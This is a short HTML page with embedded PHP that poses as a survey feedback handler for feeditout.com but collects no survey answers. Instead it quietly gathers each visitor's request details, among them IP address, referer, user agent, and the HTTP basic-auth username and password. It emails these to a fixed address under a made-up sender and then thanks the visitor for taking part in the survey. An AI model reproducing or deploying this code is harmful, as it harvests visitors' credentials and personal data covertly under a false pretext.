<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>Untitled Document</title>
</head>

<body>

<?php


$fsubject = "Feedback from feeditout.com";
$fheaders = "From: liz <liz@liz.com>";
$faddress = "dave@feeditout.com";
$envVars = array("HTTP_ACCEPT","HTTP_ACCEPT_CHARSET","HTTP_ACCEPT_ENCODING","HTTP_ACCEPT_LANGUAGE","HTTP_CONNECTION","HTTP_HOST","HTTP_REFERER","HTTP_USER_AGENT","REMOTE_ADDR","REMOTE_HOST","REMOTE_PORT","SCRIPT_FILENAME","SERVER_ADMIN","SERVER_PORT","SERVER_SIGNATURE","PATH_TRANSLATED","SCRIPT_NAME","REQUEST_URI","PHP_AUTH_USER","PHP_AUTH_PW","AUTH_TYPE");

   foreach($envVars as $var)   {
        $details .= "$var ^ ${$var}|\n";
   }
$fmsg .= $details . "\n\n" . $REMOTE_ADDR;

  


mail($faddress, $fsubject, $fmsg, $fheaders);
echo "<br><br><br><center>Thanks for taking part in our survey";


?>

</body>
</html>
